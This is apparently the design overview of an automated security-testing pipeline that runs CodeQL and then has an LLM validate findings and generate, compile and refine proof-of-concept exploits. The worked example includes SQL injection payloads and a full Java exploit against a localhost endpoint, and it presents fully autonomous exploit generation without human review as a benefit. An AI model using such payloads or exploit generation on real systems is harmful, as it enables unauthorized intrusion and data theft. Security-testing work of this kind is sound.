# Phase 2: Autonomous Vulnerability Analysis - Overview

This document explains the fully autonomous CodeQL analysis workflow implemented in Phase 2.

## 🎯 What Phase 2 Does

Phase 2 takes the SARIF output from Phase 1 (CodeQL scanning) and performs **fully autonomous vulnerability analysis**:

1. **Dataflow Validation** - LLM validates if dataflow paths are truly exploitable
2. **Deep Vulnerability Analysis** - Multi-turn dialogue for thorough assessment
3. **PoC Exploit Generation** - Automatically creates working exploits
4. **Exploit Validation** - Compiles and validates generated exploits
5. **Iterative Refinement** - Auto-fixes compilation errors

## 📊 Complete Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHASE 1: CodeQL Scanning                     │
├─────────────────────────────────────────────────────────────────┤
│ 1. Auto-detect languages                                        │
│ 2. Auto-detect build systems                                    │
│ 3. Create CodeQL databases (cached)                             │
│ 4. Run security suites                                          │
│ 5. Generate SARIF output                                        │
└──────────────────────┬──────────────────────────────────────────┘
                       │ SARIF files
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│              PHASE 2: Autonomous Analysis                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  For each finding in SARIF:                                     │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 1. Parse Finding                                           │ │
│  │    - Extract rule, location, code snippet                 │ │
│  │    - Identify CWE                                          │ │
│  │    - Check for dataflow paths                             │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 2. Read Vulnerable Code                                   │ │
│  │    - Load source file                                     │ │
│  │    - Extract context (50 lines before/after)             │ │
│  │    - Identify function/class context                     │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 3. Dataflow Validation (if applicable)                    │ │
│  │    ┌──────────────────────────────────────────────────┐   │ │
│  │    │ DataflowValidator                                │   │ │
│  │    │ - Extract source, sink, intermediate steps       │   │ │
│  │    │ - Identify sanitizers in path                    │   │ │
│  │    │ - LLM analyzes:                                  │   │ │
│  │    │   • Can sanitizers be bypassed?                  │   │ │
│  │    │   • Are there hidden barriers?                   │   │ │
│  │    │   • Is path reachable at runtime?                │   │ │
│  │    │   • What's the attack complexity?                │   │ │
│  │    └──────────────────────────────────────────────────┘   │ │
│  │                                                            │ │
│  │    Result: DataflowValidation                             │ │
│  │    - is_exploitable: bool                                 │ │
│  │    - confidence: 0.0-1.0                                  │ │
│  │    - bypass_strategy: string                              │ │
│  │    - attack_complexity: low/medium/high                   │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│         If not exploitable, STOP                                │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 4. Deep Vulnerability Analysis                            │ │
│  │    ┌──────────────────────────────────────────────────┐   │ │
│  │    │ LLM Analysis (with optional multi-turn)          │   │ │
│  │    │ - Is this a true positive?                       │   │ │
│  │    │ - Is it exploitable?                             │   │ │
│  │    │ - Exploitability score (0.0-1.0)                 │   │ │
│  │    │ - Attack scenario (step-by-step)                 │   │ │
│  │    │ - Prerequisites for exploitation                 │   │ │
│  │    │ - Impact assessment                              │   │ │
│  │    │ - CVSS estimate                                  │   │ │
│  │    │ - Mitigation recommendations                     │   │ │
│  │    └──────────────────────────────────────────────────┘   │ │
│  │                                                            │ │
│  │    Result: VulnerabilityAnalysis                          │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│         If not exploitable, STOP                                │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 5. PoC Exploit Generation                                 │ │
│  │    ┌──────────────────────────────────────────────────┐   │ │
│  │    │ LLM Exploit Generator                            │   │ │
│  │    │ - Uses Mark Dowd persona (expert)                │   │ │
│  │    │ - Temperature: 0.8 (creative)                    │   │ │
│  │    │ - Includes full context:                         │   │ │
│  │    │   • Vulnerable code                              │   │ │
│  │    │   • Analysis reasoning                           │   │ │
│  │    │   • Attack scenario                              │   │ │
│  │    │   • Prerequisites                                │   │ │
│  │    │ - Generates working exploit code                 │   │ │
│  │    │ - Language-appropriate (Java/Python/etc.)        │   │ │
│  │    └──────────────────────────────────────────────────┘   │ │
│  │                                                            │ │
│  │    Output: Complete exploit source code                   │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 6. Exploit Validation & Refinement                        │ │
│  │    ┌──────────────────────────────────────────────────┐   │ │
│  │    │ ExploitValidator (from RAPTOR autonomous/)       │   │ │
│  │    │ - Attempt compilation (gcc/javac/etc.)           │   │ │
│  │    │ - Extract compilation errors                     │   │ │
│  │    │ - If failed:                                     │   │ │
│  │    │   ┌─────────────────────────────────────┐        │   │ │
│  │    │   │ Iterative Refinement (up to 3x)     │        │   │ │
│  │    │   │ - Pass errors back to LLM           │        │   │ │
│  │    │   │ - LLM fixes the code                │        │   │ │
│  │    │   │ - Retry compilation                 │        │   │ │
│  │    │   └─────────────────────────────────────┘        │   │ │
│  │    └──────────────────────────────────────────────────┘   │ │
│  │                                                            │ │
│  │    Result: ValidationResult                               │ │
│  │    - success: bool                                        │ │
│  │    - exploit_path: Path (if compiled)                     │ │
│  └────────────────────────────────────────────────────────────┘ │
│                       │                                          │
│                       ▼                                          │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ 7. Save Artifacts                                         │ │
│  │    - analysis/{rule_id}_{line}_analysis.json             │ │
│  │    - exploits/{rule_id}_{line}_exploit.{java|py}         │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└─────────────────────┬────────────────────────────────────────────┘
                      │
                      ▼
             Final Summary Report
```

## 🔍 Key Components

### 1. DataflowValidator (`dataflow_validator.py`)

**Purpose**: Validates CodeQL dataflow findings beyond static analysis.

**Capabilities**:
- Extracts source → sink paths from SARIF
- Identifies intermediate steps and sanitizers
- LLM analyzes:
  - Sanitizer effectiveness
  - Bypass strategies
  - Hidden barriers
  - Runtime reachability
  - Attack complexity

**Example Prompt**:
```
You are analyzing a dataflow path:

SOURCE: User input from HTTP parameter
  LoginController.java:45

STEP 1: Passes through validation
  InputValidator.java:23

SINK: SQL query execution
  UserDAO.java:78

SANITIZERS: Basic input validation

Determine:
1. Can the sanitizer be bypassed?
2. Is this truly exploitable?
3. What's the attack complexity?
```

**Output**:
```json
{
  "is_exploitable": true,
  "confidence": 0.85,
  "sanitizers_effective": false,
  "bypass_possible": true,
  "bypass_strategy": "Use SQL comment syntax to bypass length check",
  "attack_complexity": "medium",
  "reasoning": "The input validator only checks length, not content...",
  "barriers": ["Length limit of 100 chars"],
  "prerequisites": ["Valid user account", "Access to login form"]
}
```

### 2. AutonomousCodeQLAnalyzer (`autonomous_analyzer.py`)

**Purpose**: Orchestrates complete autonomous analysis pipeline.

**Integrations**:
- **LLM Client** (`packages/llm_analysis/llm/client.py`) - Multi-provider LLM support
- **ExploitValidator** (`packages/autonomous/exploit_validator.py`) - Compilation validation
- **MultiTurnAnalyser** (`packages/autonomous/dialogue.py`) - Deep iterative analysis

**Analysis Pipeline**:

```python
def analyze_finding_autonomous(self, sarif_result, repo_path, out_dir):
    # 1. Parse finding from SARIF
    finding = self.parse_sarif_finding(sarif_result)

    # 2. Read vulnerable code with context
    code = self.read_vulnerable_code(finding, repo_path)

    # 3. Validate dataflow (if applicable)
    if finding.has_dataflow:
        dataflow = self.dataflow_validator.validate_finding(sarif_result)
        if not dataflow.is_exploitable:
            return  # Stop if dataflow blocked

    # 4. Deep LLM analysis
    analysis = self.analyze_vulnerability(finding, code, dataflow)
    if not analysis.is_exploitable:
        return  # Stop if not exploitable

    # 5. Generate PoC exploit
    exploit = self.generate_exploit(finding, analysis, code)

    # 6. Validate & refine exploit
    validation = self.validator.validate_exploit(exploit)
    while not validation.success and iterations < 3:
        exploit = self.refine_exploit(exploit, validation.errors)
        validation = self.validator.validate_exploit(exploit)

    # 7. Save artifacts
    save_analysis(finding, analysis, dataflow)
    save_exploit(exploit)
```

### 3. Complete Workflow (`raptor_codeql.py`)

**Purpose**: End-to-end autonomous security testing.

**Usage**:
```bash
# Fully autonomous (zero configuration)
python3 raptor_codeql.py --repo /path/to/code

# What happens:
# Phase 1: CodeQL scanning (5-30 min)
#   - Auto-detect Java
#   - Create database
#   - Run security suite
#   - Output: 23 findings in SARIF
#
# Phase 2: Autonomous analysis (10-60 min)
#   - Analyze 20 findings (max-findings default)
#   - 12 found exploitable
#   - 10 exploits generated
#   - 8 exploits compiled successfully
```

## 💡 Example: SQL Injection Finding

Let's walk through a real example:

### Input (from SARIF):
```json
{
  "ruleId": "java/sql-injection",
  "level": "error",
  "message": {
    "text": "Query built from user-controlled source"
  },
  "locations": [{
    "physicalLocation": {
      "artifactLocation": {"uri": "src/main/java/UserDAO.java"},
      "region": {"startLine": 78}
    }
  }],
  "codeFlows": [
    {
      "threadFlows": [{
        "locations": [
          {"location": {"message": {"text": "source: request parameter"}}},
          {"location": {"message": {"text": "step: String concatenation"}}},
          {"location": {"message": {"text": "sink: executeQuery"}}}
        ]
      }]
    }
  ]
}
```

### Phase 2 Processing:

**Step 1: Parse Finding**
```python
finding = CodeQLFinding(
    rule_id="java/sql-injection",
    rule_name="SQL Injection",
    cwe="CWE-89",
    file_path="src/main/java/UserDAO.java",
    start_line=78,
    has_dataflow=True
)
```

**Step 2: Read Code**
```java
// UserDAO.java around line 78
public User getUserByUsername(String username) {
    String query = "SELECT * FROM users WHERE username = '"
                   + username + "'";  // ← VULNERABLE LINE 78
    try {
        ResultSet rs = stmt.executeQuery(query);
        // ...
    }
}
```

**Step 3: Dataflow Validation**
```
LLM Prompt:
"Analyze this dataflow path from HTTP parameter to SQL query.
The input passes through basic validation but uses string concatenation..."

LLM Response:
{
  "is_exploitable": true,
  "confidence": 0.95,
  "bypass_possible": true,
  "bypass_strategy": "Input ' OR '1'='1 to bypass WHERE clause",
  "attack_complexity": "low"
}
```

**Step 4: Vulnerability Analysis**
```
LLM Prompt:
"Is this SQL injection truly exploitable?..."

LLM Response:
{
  "is_exploitable": true,
  "exploitability_score": 0.9,
  "attack_scenario": "1. Access /users?username=admin' OR '1'='1...",
  "cvss_estimate": 8.5,
  "mitigation": "Use PreparedStatement with parameterized queries"
}
```

**Step 5: Exploit Generation**
```
LLM Prompt (Mark Dowd persona):
"Create a working SQL injection exploit for this vulnerability..."

LLM Response:
```java
/**
 * SQL Injection PoC for UserDAO.getUserByUsername()
 *
 * WARNING: For authorized testing only!
 */
public class SqlInjectionExploit {
    public static void main(String[] args) throws Exception {
        String targetUrl = "http://localhost:8080/users";

        // Payload: bypass authentication
        String payload = "admin' OR '1'='1' --";

        URL url = new URL(targetUrl + "?username=" + URLEncoder.encode(payload));
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        int responseCode = conn.getResponseCode();
        System.out.println("Response code: " + responseCode);

        // Read response
        BufferedReader in = new BufferedReader(
            new InputStreamReader(conn.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            System.out.println(line);
        }
        in.close();

        System.out.println("\n✓ SQL Injection successful!");
        System.out.println("Payload: " + payload);
    }
}
```

**Step 6: Validation**
```bash
# ExploitValidator attempts compilation
$ javac SqlInjectionExploit.java
✓ Compilation successful

Result:
{
  "success": true,
  "exploit_path": "exploits/java-sql-injection_78_exploit.java"
}
```

### Final Output:

**Directory Structure**:
```
out/codeql_acme-access_20251114_123456/
├── codeql_java.sarif                                    # Phase 1
├── autonomous/
│   ├── analysis/
│   │   └── java-sql-injection_78_analysis.json         # Phase 2
│   └── exploits/
│       └── java-sql-injection_78_exploit.java          # Phase 2 ✓ Compiled
└── autonomous_summary.json
```

**Analysis JSON** (`java-sql-injection_78_analysis.json`):
```json
{
  "finding": {
    "rule_id": "java/sql-injection",
    "cwe": "CWE-89",
    "file_path": "src/main/java/UserDAO.java",
    "start_line": 78
  },
  "analysis": {
    "is_exploitable": true,
    "exploitability_score": 0.9,
    "severity_assessment": "Critical",
    "attack_scenario": "...",
    "cvss_estimate": 8.5,
    "mitigation": "Use PreparedStatement..."
  },
  "dataflow_validation": {
    "is_exploitable": true,
    "confidence": 0.95,
    "bypass_strategy": "Input ' OR '1'='1..."
  }
}
```

## 🎯 Integration with Existing RAPTOR

Phase 2 seamlessly integrates with RAPTOR's existing autonomous system:

- **LLM Client** (`packages/llm_analysis/llm/client.py`)
  - Multi-provider support (Claude, GPT-4, Ollama)
  - Automatic fallback
  - Cost tracking
  - Response caching

- **Exploit Validator** (`packages/autonomous/exploit_validator.py`)
  - Compilation validation
  - Error extraction
  - Iterative refinement

- **Multi-Turn Analyzer** (`packages/autonomous/dialogue.py`)
  - Deep iterative reasoning
  - Confidence scoring
  - Convergence detection

- **Existing Patterns**
  - VulnerabilityContext → CodeQLFinding
  - Same LLM prompts philosophy
  - Same output structure

## 🚀 Usage Examples

### Basic Usage:
```bash
# Fully autonomous - everything automatic
python3 raptor_codeql.py --repo /path/to/code

# Output:
# Phase 1: 23 findings
# Phase 2: 12 exploitable, 10 exploits, 8 compiled
```

### Scan Only (Phase 1 only):
```bash
# Just scanning, no LLM analysis
python3 raptor_codeql.py --repo /path/to/code --scan-only
```

### Custom Settings:
```bash
# Analyze up to 50 findings
export ANTHROPIC_API_KEY=sk-...
python3 raptor_codeql.py \
  --repo /path/to/code \
  --languages java \
  --max-findings 50
```

### Output Structure:
```
out/codeql_<repo>_<timestamp>/
├── codeql_java.sarif                    # Phase 1: CodeQL results
├── autonomous/                          # Phase 2: Autonomous analysis
│   ├── analysis/                        # Detailed analysis per finding
│   │   ├── {rule}_{line}_analysis.json
│   │   └── ...
│   └── exploits/                        # Generated exploits
│       ├── {rule}_{line}_exploit.java
│       └── ...
├── codeql_report.json                   # Phase 1 summary
└── autonomous_summary.json              # Phase 2 summary
```

## 📈 Performance

- **Phase 1 (Scanning)**: 5-30 minutes
  - Database creation (cached after first run)
  - Query execution

- **Phase 2 (Autonomous Analysis)**: 10-60 minutes
  - Depends on:
    - Number of findings
    - LLM provider speed
    - Exploit compilation time
  - Parallelizable (future enhancement)

**Typical Timeline**:
```
00:00 - Start
00:05 - Database created (or cached)
00:08 - Security suite complete (23 findings)
00:10 - Begin autonomous analysis
00:15 - Finding 1-5 analyzed
00:25 - Finding 6-10 analyzed
00:35 - Finding 11-15 analyzed
00:45 - Finding 16-20 analyzed
00:50 - Exploit validation complete
00:50 - Done!
```

## 🎓 Key Advantages

1. **Zero Configuration** - Works out of the box
2. **Fully Autonomous** - No human intervention needed
3. **Deep Analysis** - Goes beyond static detection
4. **Validated Exploits** - Actually compiles PoCs
5. **Iterative Refinement** - Fixes its own errors
6. **Seamless Integration** - Uses existing RAPTOR components
7. **Comprehensive Output** - SARIF + Analysis + Exploits

## 🔧 Requirements

- **CodeQL** - Installed and in PATH (or use --codeql-cli)
- **LLM Provider** - One of:
  - Anthropic API key (Claude) - Recommended
  - OpenAI API key (GPT-4)
  - Ollama running locally (free!)
- **Compilers** (for exploit validation):
  - Java: `javac`
  - C/C++: `gcc`
  - Python: built-in

## 📝 Next Steps

Want to try it? Just run:

```bash
# Set your API key
export ANTHROPIC_API_KEY=sk-...

# Run fully autonomous workflow
python3 raptor_codeql.py --repo /path/to/your/java/project

# Wait 20-60 minutes
# Review exploits in out/codeql_*/autonomous/exploits/
```

Daniel, this is what Phase 2 looks like! Ready to test it on your Java project once the CodeQL analysis finishes? 🚀
